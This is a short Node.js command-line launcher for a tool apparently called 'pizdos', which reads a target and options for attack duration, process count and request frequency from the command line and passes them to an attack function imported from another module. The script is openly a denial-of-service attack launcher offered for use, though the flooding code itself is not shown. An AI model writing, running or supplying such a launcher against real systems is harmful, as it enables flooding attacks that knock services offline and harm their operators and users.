#!/usr/bin/env node
const pizdos = require('../src/pizdos')

let options = {
    "attackDuration": process.argv[3],
    "processesCount": process.argv[4],
    "requestsFrequency": process.argv[5]  
}

for (parameter in options) {
    if (!options[parameter]) {
        delete options[parameter]
    }
}

pizdos.attack(process.argv[2], options)